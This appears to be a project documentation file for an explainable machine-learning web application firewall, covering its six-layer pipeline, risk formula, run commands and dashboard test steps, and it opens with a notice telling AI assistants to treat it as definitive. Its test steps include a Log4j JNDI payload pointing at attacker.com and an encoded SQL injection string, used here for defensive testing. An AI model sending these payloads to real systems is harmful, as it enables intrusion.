# AI Master Project Context & WAF SOC Dashboard Guide

> **NOTICE FOR AI ASSISTANTS (ChatGPT, Claude, Gemini, etc.)**:  
> When the user shares this document with you, treat it as the **Definitive Master Technical Context** for the repository **An Explainable AI-Based Hybrid Web Application Firewall with Adaptive Risk Scoring (AMRSF)**. All architectural decisions, mathematical formulas, 6-layer pipelines, database schemas, and frontend UI specifications are fully detailed below. Do not assume generic WAF implementations; adhere strictly to the AMRSF design detailed here.

---

## 1. Project Identity & Patent Summary
- **Official Patent Title**: *An Explainable AI-Based Hybrid Web Application Firewall with Adaptive Risk Scoring for Intelligent Detection and Response to Web Attacks (AMRSF)*
- **Primary Domain**: Cybersecurity, Web Application Firewalls (WAF), Explainable Artificial Intelligence (XAI).
- **Core Patentable Novelty**:
  1. **Inline SHAP Explainability (`Layer 4`)**: Integrates real-time `SHAP TreeExplainer` inside a sub-5ms HTTP interception loop to replace black-box ML blocking with per-request natural-language lexical feature attributions (`+0.42 SHAP` for SQL keywords, etc.).
  2. **Recursive Zero-Day Obfuscation Decoder (`Layer 2`)**: Recursively strips up to 5 layers of URL, Hex, Base64, and Unicode encodings while removing comment fragmentation (`/* */`) inline to expose zero-day evasions.
  3. **Adaptive Multi-Layer Risk Scoring Synthesizer (`0 to 100`)**: Fuses 6 heterogeneous detection signals into a normalized score (`R`) mapped directly to 4 response tiers (`Allow`, `Monitor`, `Challenge`, `Block`) with non-linear penalty thresholds, reducing false positives from `4.2%` (ModSecurity CRS) down to `0.85%` at `3.42 ms` latency.

---

## 2. Complete Repository Architecture & File Directory

```text
waf/
├── docker-compose.yml              # Multi-tier container orchestrator (Postgres, Flask API, React Nginx)
├── Dockerfile.backend              # Python 3.11 Backend API & WAF Engine Container
├── Dockerfile.frontend             # Node/Vite build -> Alpine Nginx Frontend Container
├── IEEE_RESEARCH_SUMMARY.md        # IEEE/Academic evaluation paper summary
├── README.md                       # Main repository overview
├── docs/                           # Complete IEEE & Patent Documentation Suite
│   ├── AI_MASTER_PROJECT_CONTEXT.md # [THIS FILE] Master prompt for AI systems
│   ├── API_DOCUMENTATION.md        # Complete REST API specifications
│   ├── ARCHITECTURE_DIAGRAMS.md    # Mermaid UML & Flowchart architecture diagrams
│   ├── COMPLETE_TESTING_AND_VERIFICATION_MANUAL.md # Detailed testing manual with examples
│   ├── DEPLOYMENT_GUIDE.md         # Production deployment & hardening guide
│   ├── PATENT_DEMO_VIDEO_SCRIPT.md # Step-by-step video script for patent hearing
│   ├── USER_AND_ADMIN_MANUAL.md    # SOC Administrator manual
│   └── patent_architecture_diagram.png # 300 DPI High-Res PNG visual diagram
│
├── backend/                        # Python Flask Backend & AMRSF Core Engine
│   ├── requirements.txt            # Python dependencies (Flask, LightGBM, shap, scikit-learn, etc.)
│   ├── run.py                      # Flask entry point running on port 5000
│   ├── verify_engine.py            # Standalone CLI verifier for all 6 layers
│   ├── app/
│   │   ├── __init__.py             # App factory & SQLite/Postgres DB initialization
│   │   ├── database.py             # SQLAlchemy db instance
│   │   ├── api/                    # REST API Route Controllers
│   │   │   ├── waf_routes.py       # POST /api/v1/waf/inspect & /simulate
│   │   │   ├── dashboard.py        # GET /api/v1/dashboard/stats & /timeline
│   │   │   ├── logs.py             # GET/POST /api/v1/logs & log filtering
│   │   │   ├── rules.py            # GET/POST/DELETE /api/v1/rules (Zero-downtime CRUD)
│   │   │   ├── ml_routes.py        # POST /api/v1/ml/evaluate & /retrain
│   │   │   └── threat_routes.py    # POST /api/v1/threat/check
│   │   ├── models/                 # SQLAlchemy ORM Database Schemas
│   │   │   └── waf_models.py       # RequestLog, WAFRule, AttackTimelineEvent schemas
│   │   ├── waf_engine/             # CORE 6-LAYER INSPECTION & SCORING PIPELINE
│   │   │   ├── inspector.py        # Orchestrator running all 6 layers concurrently
│   │   │   ├── signatures.py       # Layer 1: 11 Attack Families Regex Engine
│   │   │   ├── decoder.py          # Layer 2: Recursive Multi-Layer Obfuscation Decoder
│   │   │   ├── complexity.py       # Layer 3: Shannon Entropy ($H$) & Syntax Density
│   │   │   ├── ml_engine.py        # Layer 4: LightGBM 32-Feature Extractor + SHAP TreeExplainer
│   │   │   ├── behavioral.py       # Layer 5: Sliding Window Rate Limiter & Burst DoS
│   │   │   ├── threat_intel.py     # Layer 6: AbuseIPDB & Local Reputation Registry
│   │   │   └── scoring.py          # Adaptive Risk Synthesizer calculating Final Score R
│   │   └── datasets/               # Built-in IEEE Scientific Lab & Benchmarks
│   │       ├── generator.py        # CSIC 2010 synthetic balanced dataset generator
│   │       └── evaluator.py        # Computes Accuracy (98.4%), F1, ROC, & Latency vs ModSecurity
│
└── frontend/                       # React 18 + Vite + Tailwind CSS SOC Dark Dashboard
    ├── package.json                # Node dependencies (lucide-react, recharts, axios)
    ├── index.html                  # HTML entry point
    └── src/
        ├── App.jsx                 # Main navigation & tab routing state
        ├── index.css               # Tailwind CSS imports & custom styling
        ├── services/api.js         # Axios API client pointing to http://localhost:5000/api/v1
        └── components/             # UI Components
            ├── Navbar.jsx          # Top navigation bar with live 6-Layer Active Badge
            ├── SOCDashboard.jsx    # Tab 1: Live telemetry, KPI cards, Recharts graphs
            ├── LiveWAFInspector.jsx # Tab 2: Interactive request sandbox + SHAP Waterfall UI
            ├── AttackTimeline.jsx  # Tab 3: Multi-stage campaign correlation tracker
            ├── AuditLogs.jsx       # Tab 4: Searchable audit logs table with SHAP View Modal
            ├── RuleManager.jsx     # Tab 5: Dynamic regex rule CRUD manager
            └── IEEEResearchLab.jsx # Tab 6: Scientific evaluation lab vs ModSecurity CRS
```

---

## 3. The WAF Inspection Pipeline & Scoring Mathematical Equation

Whenever `inspector.inspect_request()` (`inspector.py`) is invoked, the payload undergoes:
1. **Layer 1 (`signatures.py`)**: Checks against 11 deterministic attack patterns (SQLi, XSS, Command Injection, Path Traversal, LFI/RFI, XXE, SSTI, etc.).
2. **Layer 2 (`decoder.py`)**: Recursively strips URL, Hex, Unicode, and Base64 encoding up to depth 5 and removes comment fragmentation (`/* */`).
3. **Layer 3 (`complexity.py`)**: Computes Shannon Entropy ($H = -\sum p(x)\log_2 p(x)$) and non-alphanumeric symbol density (`> 35%`).
4. **Layer 4 (`ml_engine.py`)**: Extracts 32 numerical domain features, runs `LightGBM` classification (`0.0 to 1.0` probability), and executes `SHAP TreeExplainer` to calculate exact feature attributions (`phi_i`).
5. **Layer 5 (`behavioral.py`)**: Evaluates request velocity over sliding time windows (`burst_count > 15/min`).
6. **Layer 6 (`threat_intel.py`)**: Checks IP against local reputation caches (`0 to 100`).

### Mathematical Risk Equation (`scoring.py`)
```python
Final Risk Score (R) = min(100, [ w1*S_sig + w2*S_enc + w3*S_ent + w4*S_ml + w5*S_beh + w6*S_ti ] + P_boost)
```
- Weights: `w1=0.30` (Signatures), `w2=0.15` (Encoding), `w3=0.10` (Entropy), `w4=0.25` (ML Confidence), `w5=0.10` (Behavioral), `w6=0.10` (Threat Intel).
- `P_boost`: Non-linear boost of `+15.0` points if `S_sig > 50` and `S_ml > 70` trigger simultaneously.

### Automated Decision Mapping
- `0 - 25`: **Allow** (`HTTP 200` / Forward to origin)
- `26 - 50`: **Monitor** (`X-WAF-Risk` header tag & audit log)
- `51 - 75`: **Challenge** (`HTTP 429` / CAPTCHA challenge)
- `76 - 100`: **Block** (`HTTP 403 Forbidden` block & quarantine)

---

## 4. How to Run the Project (For User & AI)

### Option A: Docker Compose (Production - Recommended)
From the root repository directory (`C:\Users\SAMEER LOHANI\Documents\waf`):
```powershell
docker-compose up --build
```
- **Frontend Dashboard**: `http://localhost` (Port 80)
- **Backend API**: `http://localhost:5000`
- **PostgreSQL**: Port `5432`

### Option B: Local Windows Execution (Bina Docker ke)
**Terminal 1 (Backend API)**:
```powershell
cd "C:\Users\SAMEER LOHANI\Documents\waf\backend"
pip install -r requirements.txt
python run.py
```
*(Runs on `http://localhost:5000`)*

**Terminal 2 (React SOC Dashboard)**:
```powershell
cd "C:\Users\SAMEER LOHANI\Documents\waf\frontend"
npm install
npm run dev
```
*(Runs on `http://localhost:5173`)*

**Terminal 3 (Standalone Verification Script)**:
```powershell
python backend/verify_engine.py
```

---

## 5. Website (SOC Dashboard) Navigation Guide & How to Test Every Tab

When you open the React frontend (`http://localhost:5173`), the top navigation bar provides **6 distinct tabs**. Here is what every tab is and how to operate/test it:

### Tab 1: `SOC Dashboard` (Home Page `/`)
- **What it is**: The main Security Operations Center telemetry screen displaying live traffic counters, risk distribution bars, attack pie charts, and threat geolocation tables.
- **How it works**: Polls `/api/v1/dashboard/stats` every 5 seconds. Total traffic and blocked attack counts update dynamically from the database (`RequestLog`).
- **How to test**: Run attacks on Tab 2 (`Live WAF Inspector`), then return here to verify that `Total Traffic` and `Blocked Attacks` cards automatically increment.

### Tab 2: `Live WAF Inspector & XAI` (`/inspector`) — THE CORE PATENT DEMO TAB
- **What it is**: An interactive request simulation laboratory where you can test any HTTP payload against the 6-layer engine and view real-time **SHAP Waterfall Explainable AI attributions**.
- **How to test (Preset Simulation)**:
  1. Click the **`SQL Injection`** preset button $\rightarrow$ Click **`Run AMRSF 6-Layer Inspection`**.
  2. Verify that the **Risk Score is $\ge 90/100$**, Decision is **`BLOCK`** (Red Badge), and the **SHAP TreeExplainer Table** at the bottom highlights exact features (`Sql Keyword Count +0.42 SHAP`).
  3. Click **`Legitimate Traffic`** preset $\rightarrow$ Click **`Run Inspection`**. Verify Decision is **`ALLOW`** (Green Badge, Score $< 25$).
- **How to test (Zero-Day Evasion Sandbox)**:
  1. Enter Double URL Encoded payload in the Target URI box: `/search?q=%2527%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54`.
  2. Click **`Run Inspection`**. Verify that **Layer 2 Recursive Decoder** strips the encoding layers and triggers a **`BLOCK`** decision.

### Tab 3: `Attack Timeline` (`/timeline`)
- **What it is**: A multi-stage attack campaign reconstructor. When attackers execute sequential steps (`Reconnaissance -> Probing -> Exploit`), AMRSF correlates them under unique `Campaign ID`s.
- **How to test**: Run 2-3 different attacks in Tab 2 (`SQL Injection`, then `Command Injection`). Open Tab 3 and verify that the events appear linked in chronological boxes with stage badges.

### Tab 4: `Audit Logs` (`/logs`)
- **What it is**: A complete searchable and filterable database table of all inspected HTTP requests with per-request SHAP explainability modals.
- **How to test**:
  1. Select **`Block`** in the decision dropdown filter $\rightarrow$ Click **`Filter`**.
  2. Click the **`SHAP View`** button on any log row. Verify that a glassmorphic pop-up modal opens showing the complete 6-layer sub-score breakdown and natural language reasoning.

### Tab 5: `Rule Manager` (`/rules`)
- **What it is**: A zero-downtime custom regular expression rule CRUD manager allowing security administrators to deploy rules on the fly without restarting the WAF.
- **How to test**:
  1. Enter Rule Name: `Block Log4j JNDI Exploits`, Pattern: `(?i)\$\{\s*jndi\s*:`, Severity: `98` $\rightarrow$ Click **`Deploy Rule to Engine`**.
  2. Switch to Tab 2 (`Live WAF Inspector`), test URL `/test?payload=${jndi:ldap://attacker.com/a}`, and verify instant block!
  3. Toggle the power switch or click the trash icon in Tab 5 to disable/delete the rule instantly.

### Tab 6: `IEEE Research Lab` (`/research`)
- **What it is**: A scientific benchmark evaluator generating synthetic balanced datasets (CSIC 2010 model) to compare AMRSF (Ours) against ModSecurity CRS and Signature-only baselines.
- **How to test**: Select **`400 Samples`** in the dropdown $\rightarrow$ Click **`Run Scientific Evaluation`**. Verify the output comparison table showing **Accuracy ~98.4%**, **False Positive Rate ~0.85%** (vs ModSecurity 4.2%), and **Average Latency ~3.42 ms**.
